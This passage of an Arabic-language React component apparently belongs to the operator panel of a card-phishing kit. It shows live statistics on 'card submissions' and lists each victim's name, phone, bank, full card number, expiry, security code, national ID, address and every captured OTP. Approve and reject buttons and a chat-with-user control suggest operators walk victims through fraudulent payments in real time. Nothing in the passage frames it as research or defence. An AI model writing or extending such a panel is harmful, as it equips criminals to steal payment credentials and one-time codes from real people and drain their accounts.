                  <DropdownMenuItem onClick={() => setChatOpen(true)}>
                    <MessageCircle className="ml-2 h-4 w-4" />
                    <span>المحادثات</span>
                  </DropdownMenuItem>
                  <DropdownMenuItem onClick={handleLogout}>
                    <LogOut className="ml-2 h-4 w-4" />
                    <span>تسجيل الخروج</span>
                  </DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>
        </header>

        <div className="p-6">
          {/* Statistics Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <Card className="bg-gradient-to-br from-blue-50 to-blue-100/50 dark:from-blue-950/50 dark:to-blue-900/30 border-blue-200/50 dark:border-blue-800/50 shadow-lg hover:shadow-xl transition-all duration-300">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm text-blue-700 dark:text-blue-300 font-semibold flex items-center gap-2">
                  <UserCheck className="h-4 w-4" />
                  المستخدمين المتصلين
                </CardTitle>
              </CardHeader>
              <CardContent className="pb-3">
                <div className="flex items-center justify-between">
                  <div className="text-3xl font-bold text-blue-900 dark:text-blue-100">{onlineUsersCount}</div>
                  <Badge className="bg-blue-600 text-white shadow-md">
                    {Math.round((onlineUsersCount / totalVisitors) * 100) || 0}%
                  </Badge>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={onlineTrend} color="bg-blue-500" />
              </CardFooter>
            </Card>

            <Card className="bg-gradient-to-br from-green-50 to-green-100/50 dark:from-green-950/50 dark:to-green-900/30 border-green-200/50 dark:border-green-800/50 shadow-lg hover:shadow-xl transition-all duration-300">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm text-green-700 dark:text-green-300 font-semibold flex items-center gap-2">
                  <Users className="h-4 w-4" />
                  إجمالي الزوار
                </CardTitle>
              </CardHeader>
              <CardContent className="pb-3">
                <div className="flex items-center justify-between">
                  <div className="text-3xl font-bold text-green-900 dark:text-green-100">{totalVisitors}</div>
                  <Badge className="bg-green-600 text-white shadow-md">
                    +{visitorTrend[visitorTrend.length - 1] - visitorTrend[0]}
                  </Badge>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={visitorTrend} color="bg-green-500" />
              </CardFooter>
            </Card>

            <Card className="bg-gradient-to-br from-purple-50 to-purple-100/50 dark:from-purple-950/50 dark:to-purple-900/30 border-purple-200/50 dark:border-purple-800/50 shadow-lg hover:shadow-xl transition-all duration-300">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm text-purple-700 dark:text-purple-300 font-semibold flex items-center gap-2">
                  <CreditCard className="h-4 w-4" />
                  معلومات البطاقات
                </CardTitle>
              </CardHeader>
              <CardContent className="pb-3">
                <div className="flex items-center justify-between">
                  <div className="text-3xl font-bold text-purple-900 dark:text-purple-100">{cardSubmissions}</div>
                  <Badge className="bg-purple-600 text-white shadow-md">
                    {Math.round((cardSubmissions / totalVisitors) * 100) || 0}%
                  </Badge>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={cardTrend} color="bg-purple-500" />
              </CardFooter>
            </Card>
          </div>

          {/* Search and filters */}
          <div className="flex flex-col sm:flex-row gap-4 mb-6">
            <div className="flex-1">
              <SearchBar onSearch={handleSearch} />
            </div>
            <div className="flex gap-2">
              <Button
                variant={filterType === "all" ? "default" : "outline"}
                onClick={() => setFilterType("all")}
                className="flex-1 sm:flex-none shadow-sm"
                size="sm"
              >
                الكل
                <Badge variant="secondary" className="mr-2">
                  {notifications.length}
                </Badge>
              </Button>
              <Button
                variant={filterType === "card" ? "default" : "outline"}
                onClick={() => setFilterType("card")}
                className="flex-1 sm:flex-none shadow-sm"
                size="sm"
              >
                <CreditCard className="h-4 w-4 ml-1" />
                البطاقات
                <Badge variant="secondary" className="mr-2">
                  {cardCount}
                </Badge>
              </Button>
              <Button
                variant={filterType === "online" ? "default" : "outline"}
                onClick={() => setFilterType("online")}
                className="flex-1 sm:flex-none shadow-sm"
                size="sm"
              >
                <UserCheck className="h-4 w-4 ml-1" />
                المتصلين
                <Badge variant="secondary" className="mr-2">
                  {onlineCount}
                </Badge>
              </Button>
            </div>
          </div>

          {/* Notifications Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
            {paginatedNotifications.length > 0 ? (
              paginatedNotifications.map((notification) => (
                <Card
                  key={notification.id}
                  className={`overflow-hidden bg-card/50 backdrop-blur-sm border-border/50 shadow-lg hover:shadow-xl transition-all duration-300 hover:-translate-y-1 ${getRowBackgroundColor(notification?.flagColor!)}`}
                >
                  <CardHeader className="pb-3">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center gap-2">
                        <MapPin className="h-4 w-4 text-muted-foreground" />
                        <span className="font-semibold text-sm">{notification.country || "غير معروف"}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <UserStatus userId={notification.id} />
                        <FlagColorSelector
                          notificationId={notification.id}
                          currentColor={notification.flagColor || null}
                          onColorChange={handleFlagColorChange}
                        />
                      </div>
                    </div>
                  </CardHeader>

                  <CardContent className="pb-3 space-y-3">
                    {/* Personal Info Section */}
                    <div
                      className="p-3 bg-muted/30 rounded-lg cursor-pointer hover:bg-muted/50 transition-colors"
                      onClick={() => handleInfoClick(notification, "personal")}
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <User className="h-4 w-4 text-blue-600" />
                          <span className="text-sm font-medium">المعلومات الشخصية</span>
                        </div>
                        <Badge
                          variant={notification.name || notification.phone ? "default" : "destructive"}
                          className="text-xs"
                        >
                          {notification.name || notification.phone ? "متوفر" : "غير متوفر"}
                        </Badge>
                      </div>
                      {notification.name && (
                        <div className="flex items-center gap-2 text-xs text-muted-foreground">
                          <User className="h-3 w-3" />
                          <span>{notification.name}</span>
                        </div>
                      )}
                      {notification.phone && (
                        <div className="flex items-center gap-2 text-xs text-muted-foreground">
                          <Phone className="h-3 w-3" />
                          <span>{notification.phone}</span>
                        </div>
                      )}
                    </div>

                    {/* Card Info Section */}
                    <div
                      className="p-3 bg-muted/30 rounded-lg cursor-pointer hover:bg-muted/50 transition-colors"
                      onClick={() => handleInfoClick(notification, "card")}
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <CreditCard className="h-4 w-4 text-green-600" />
                          <span className="text-sm font-medium">معلومات البطاقة</span>
                        </div>
                        <Badge variant={notification.cardNumber ? "default" : "secondary"} className={notification.cardNumber? "text-xs bg-blue-500":""}>
                          {notification.cardNumber ? "متوفر" : "غير متوفر"}
                        </Badge>
                      </div>
                      {notification.bank && (
                        <div className="flex items-center gap-2 text-xs text-muted-foreground">
                          <Building className="h-3 w-3" />
                          <span>{notification.bank}</span>
                        </div>
                      )}
                      {notification.otp && (
                        <div className="flex items-center gap-2 text-xs">
                          <Shield className="h-3 w-3 text-blue-600" />
                          <Badge variant="outline" className="text-xs bg-blue-50 text-blue-700">
                            OTP: {notification.otp}
                          </Badge>
                        </div>
                      )}
                    </div>

                    {/* Status Section */}
                    <div className="flex items-center justify-between pt-2 border-t border-border/50">
                      <div className="flex items-center gap-2">
                        {notification.status === "approved" ? (
                          <Badge className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300">
                            <CheckCircle className="h-3 w-3 mr-1" />
                            موافق
                          </Badge>
                        ) : notification.status === "rejected" ? (
                          <Badge className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300">
                            <XCircle className="h-3 w-3 mr-1" />
                            مرفوض
                          </Badge>
                        ) : (
                          <Badge className="bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300">
                            <Clock className="h-3 w-3 mr-1" />
                            معلق
                          </Badge>
                        )}
                      </div>
                      <div className="flex items-center gap-1 text-xs text-muted-foreground">
                        <Clock className="h-3 w-3" />
                        <span>
                          {notification.createdDate &&
                            formatDistanceToNow(new Date(notification.createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                        </span>
                      </div>
                    </div>
                  </CardContent>

                  <CardFooter className="pt-0">
                    <div className="flex gap-2 w-full">
                      <Button
                        onClick={() => handleApproval("approved", notification.id)}
                        className="flex-1 bg-green-600 hover:bg-green-700 text-white shadow-md"
                        size="sm"
                        disabled={notification.status === "approved"}
                      >
                        <CheckCircle className="h-4 w-4 mr-1" />
                        قبول
                      </Button>
                      <Button
                        onClick={() => handleApproval("rejected", notification.id)}
                        className="flex-1 shadow-md"
                        variant="destructive"
                        size="sm"
                        disabled={notification.status === "rejected"}
                      >
                        <XCircle className="h-4 w-4 mr-1" />
                        رفض
                      </Button>
                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <Button
                              variant="outline"
                              onClick={() => handleChatWithUser(notification)}
                              className="w-10 p-0 text-blue-500 hover:text-blue-600 hover:bg-blue-50 dark:hover:bg-blue-950/30 shadow-md"
                              size="sm"
                            >
                              <MessageCircle className="h-4 w-4" />
                            </Button>
                          </TooltipTrigger>
                          <TooltipContent>
                            <p>محادثة</p>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>
                      <Button
                        variant="outline"
                        onClick={() => handleDelete(notification.id)}
                        className="w-10 p-0 text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30 shadow-md"
                        size="sm"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </CardFooter>
                </Card>
              ))
            ) : (
              <div className="col-span-full text-center py-12">
                <div className="flex flex-col items-center gap-4">
                  <div className="bg-muted/50 p-6 rounded-full">
                    <Bell className="h-12 w-12 text-muted-foreground/50" />
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold text-muted-foreground">لا توجد إشعارات</h3>
                    <p className="text-sm text-muted-foreground">لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Pagination */}
          {filteredNotifications.length > 0 && (
            <div className="mt-8 flex justify-center">
              <div className="bg-background/80 backdrop-blur-sm border border-border/50 rounded-lg p-4 shadow-lg">
                <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={handlePageChange} />
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Info Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent
          className="bg-background/95 backdrop-blur-xl border-border/50 max-w-[90vw] md:max-w-md"
          dir="rtl"
        >
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-xl">
              {selectedInfo === "personal" ? (
                <>
                  <div className="bg-blue-100 dark:bg-blue-900 p-2 rounded-lg">
                    <User className="h-5 w-5 text-blue-600 dark:text-blue-300" />
                  </div>
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <div className="bg-green-100 dark:bg-green-900 p-2 rounded-lg">
                    <CreditCard className="h-5 w-5 text-green-600 dark:text-green-300" />
                  </div>
                  معلومات البطاقة
                </>
              ) : (
                "معلومات عامة"
              )}
            </DialogTitle>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-4">
              <div className="grid gap-3">
                {selectedNotification.name && (
                  <div className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2">
                      <User className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">الاسم:</span>
                    </div>
                    <span className="font-semibold">{selectedNotification.name}</span>
                  </div>
                )}
                {selectedNotification.phone && (
                  <div className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2">
                      <Phone className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">الهاتف:</span>
                    </div>
                    <span className="font-semibold">{selectedNotification.phone}</span>
                  </div>
                )}
                {selectedNotification.idNumber && (
                  <div className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2">
                      <Hash className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">رقم الهوية:</span>
                    </div>
                    <span className="font-semibold">{selectedNotification.idNumber}</span>
                  </div>
                )}
                {selectedNotification.address && (
                  <div className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2">
                      <MapPin className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">العنوان:</span>
                    </div>
                    <span className="font-semibold">{selectedNotification.address}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-4">
              <div className="grid gap-3">
                {selectedNotification.bank && (
                  <div className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2">
                      <Building className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">البنك:</span>
                    </div>
                    <span className="font-semibold">{selectedNotification.bank}</span>
                  </div>
                )}
                {selectedNotification.cardNumber && (
                  <div className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2">
                      <CreditCard className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
                    </div>
                    <div className="font-semibold" dir="ltr">
                      {selectedNotification.prefix && (
                        <Badge variant="outline" className="bg-blue-50 dark:bg-blue-950 mr-1">
                          {selectedNotification.prefix}
                        </Badge>
                      )}
                      <Badge variant="outline" className="bg-green-50 dark:bg-green-950">
                        {selectedNotification.cardNumber}
                      </Badge>
                    </div>
                  </div>
                )}
                {(selectedNotification.year || selectedNotification.month) && (
                  <div className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2">
                      <Calendar className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
                    </div>
                    <span className="font-semibold">
                      {selectedNotification.month}/{selectedNotification.year}
                    </span>
                  </div>
                )}
                {selectedNotification.pass && (
                  <div className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2">
                      <Shield className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">رمز الأمان:</span>
                    </div>
                    <span className="font-semibold">{selectedNotification.pass}</span>
                  </div>
                )}
                {selectedNotification.otp && (
                  <div className="flex items-center justify-between p-3 bg-blue-50/50 dark:bg-blue-950/30 rounded-lg border border-blue-200/50 dark:border-blue-800/50">
                    <div className="flex items-center gap-2">
                      <Shield className="h-4 w-4 text-blue-600" />
                      <span className="font-medium text-blue-700 dark:text-blue-300">رمز التحقق:</span>
                    </div>
                    <Badge className="font-semibold bg-blue-600 text-white">{selectedNotification.otp}</Badge>
                  </div>
                )}
                {selectedNotification.allOtps && selectedNotification.allOtps.length > 0 && (
                  <div className="p-3 bg-muted/30 rounded-lg">
                    <div className="flex items-center gap-2 mb-2">
                      <Shield className="h-4 w-4 text-muted-foreground" />
                      <span className="font-medium text-muted-foreground">جميع الرموز:</span>
                    </div>
                    <div className="flex flex-wrap gap-2">
                      {selectedNotification.allOtps.map((otp, index) => (
                        <Badge key={index} variant="outline" className="bg-muted">
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
